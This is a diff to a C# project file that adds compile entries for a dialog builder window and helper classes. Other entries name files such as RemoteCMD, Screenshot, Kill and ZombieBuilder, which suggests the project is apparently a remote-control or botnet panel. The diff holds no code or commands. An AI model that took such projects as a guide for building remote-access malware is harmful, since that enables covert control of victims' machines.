@@ -99,11 +99,13 @@
     <Compile Include="Event\GenericCommandArgs.cs" />
     <Compile Include="Event\ImageArgs.cs" />
     <Compile Include="Functions\ControlInput.cs" />
+    <Compile Include="Functions\DialogInfo.cs" />
     <Compile Include="Functions\Downlaod.cs" />
     <Compile Include="Functions\FunctionManager.cs" />
     <Compile Include="Functions\Kill.cs" />
     <Compile Include="Functions\RemoteCMD.cs" />
     <Compile Include="Functions\Screenshot.cs" />
+    <Compile Include="Helper\ComboboxItem.cs" />
     <Compile Include="Helper\ZombieBuilder.cs" />
     <Compile Include="Web\Server.cs" />
     <Compile Include="Web\StateObject.cs" />
@@ -112,6 +114,9 @@
     </Compile>
     <Compile Include="Windows\CommandWindow.xaml.cs">
       <DependentUpon>CommandWindow.xaml</DependentUpon>
+    </Compile>
+    <Compile Include="Windows\DialogBuilder.xaml.cs">
+      <DependentUpon>DialogBuilder.xaml</DependentUpon>
     </Compile>
     <Compile Include="Windows\ScreenControlWindow.xaml.cs">
       <DependentUpon>ScreenControlWindow.xaml</DependentUpon>
@@ -125,6 +130,10 @@
       <Generator>MSBuild:Compile</Generator>
     </Page>
     <Page Include="Windows\CommandWindow.xaml">
+      <SubType>Designer</SubType>
+      <Generator>MSBuild:Compile</Generator>
+    </Page>
+    <Page Include="Windows\DialogBuilder.xaml">
       <SubType>Designer</SubType>
       <Generator>MSBuild:Compile</Generator>
     </Page>
